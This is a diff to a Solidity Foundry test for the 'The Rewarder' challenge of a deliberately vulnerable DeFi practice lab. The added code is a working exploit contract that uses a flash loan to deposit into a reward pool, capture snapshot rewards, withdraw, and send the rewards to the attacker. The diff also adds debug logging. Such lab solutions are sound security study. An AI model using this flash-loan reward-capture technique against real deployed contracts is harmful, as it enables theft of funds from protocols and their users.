@@ -11,9 +11,12 @@ import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingTok
 import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
 
 contract TheRewarder is Test {
+    // 1 million token
     uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
+    // user depositting
     uint256 internal constant USER_DEPOSIT = 100e18;
 
+    // import utils
     Utilities internal utils;
     FlashLoanerPool internal flashLoanerPool;
     TheRewarderPool internal theRewarderPool;
@@ -51,6 +54,9 @@ contract TheRewarder is Test {
         dvt.transfer(address(flashLoanerPool), TOKENS_IN_LENDER_POOL);
 
         theRewarderPool = new TheRewarderPool(address(dvt));
+        console.log("1:", theRewarderPool.lastRecordedSnapshotTimestamp());
+        console.log("1:", theRewarderPool.lastSnapshotIdForRewards());
+        console.log("1:", theRewarderPool.roundNumber());
 
         // Alice, Bob, Charlie and David deposit 100 tokens each
         for (uint8 i; i < 4; i++) {
@@ -64,6 +70,9 @@ contract TheRewarder is Test {
             );
             vm.stopPrank();
         }
+        console.log("2:", theRewarderPool.lastRecordedSnapshotTimestamp());
+        console.log("2:", theRewarderPool.lastSnapshotIdForRewards());
+        console.log("2:", theRewarderPool.roundNumber());
 
         assertEq(theRewarderPool.accToken().totalSupply(), USER_DEPOSIT * 4);
         assertEq(theRewarderPool.rewardToken().totalSupply(), 0);
@@ -79,6 +88,9 @@ contract TheRewarder is Test {
                 25e18 // Each depositor gets 25 reward tokens
             );
         }
+        console.log("3:", theRewarderPool.lastRecordedSnapshotTimestamp());
+        console.log("3:", theRewarderPool.lastSnapshotIdForRewards());
+        console.log("3:", theRewarderPool.roundNumber());
 
         assertEq(theRewarderPool.rewardToken().totalSupply(), 100e18);
         assertEq(dvt.balanceOf(attacker), 0); // Attacker starts with zero DVT tokens in balance
@@ -91,7 +103,21 @@ contract TheRewarder is Test {
         /**
          * EXPLOIT START *
          */
+        // use flashloan to deposit and then withdraw to exploit the reward
+        skip(6 days);
+        vm.startPrank(attacker);
+        ExploitContract exploitContract;
+        exploitContract = new ExploitContract(
+            address(flashLoanerPool),
+            address(theRewarderPool),
+            address(dvt)
+        );
 
+        vm.label(address(exploitContract), "exploitContract");
+
+        exploitContract.attack(TOKENS_IN_LENDER_POOL);
+
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
@@ -102,6 +128,9 @@ contract TheRewarder is Test {
     }
 
     function validation() internal {
+        console.log("3:", theRewarderPool.lastRecordedSnapshotTimestamp());
+        console.log("3:", theRewarderPool.lastSnapshotIdForRewards());
+        console.log("3:", theRewarderPool.roundNumber());
         assertEq(theRewarderPool.roundNumber(), 3); // Only one round should have taken place
         for (uint8 i; i < 4; i++) {
             // Users should get negligible rewards this round
@@ -125,5 +154,37 @@ contract TheRewarder is Test {
 
         // Attacker finishes with zero DVT tokens in balance
         assertEq(dvt.balanceOf(attacker), 0);
+    }
+}
+
+contract ExploitContract {
+    FlashLoanerPool internal flashLoanerPool;
+    TheRewarderPool internal theRewarderPool;
+    DamnValuableToken internal dvt;
+    RewardToken internal rewardToken;
+    address owner;
+
+    constructor(address addr, address addr2, address addr3) {
+        owner = msg.sender;
+        flashLoanerPool = FlashLoanerPool(addr);
+        theRewarderPool = TheRewarderPool(addr2);
+        dvt = DamnValuableToken(addr3);
+        rewardToken = RewardToken(theRewarderPool.rewardToken());
+    }
+
+    function attack(uint256 amount) external {
+        dvt.approve(address(theRewarderPool), type(uint256).max);
+        flashLoanerPool.flashLoan(amount);
+    }
+
+    function receiveFlashLoan(uint256 amount) public {
+        require(msg.sender == address(flashLoanerPool), "only pool");
+        theRewarderPool.deposit(amount);
+        theRewarderPool.withdraw(amount);
+        bool paidBorrow = dvt.transfer(address(flashLoanerPool), amount);
+        require(paidBorrow, "borrow not paid back");
+        uint256 rewardBalance = rewardToken.balanceOf(address(this));
+        bool rewardSent = rewardToken.transfer(owner, rewardBalance);
+        require(rewardSent, "Reward not sent back to the contract's owner");
     }
 }
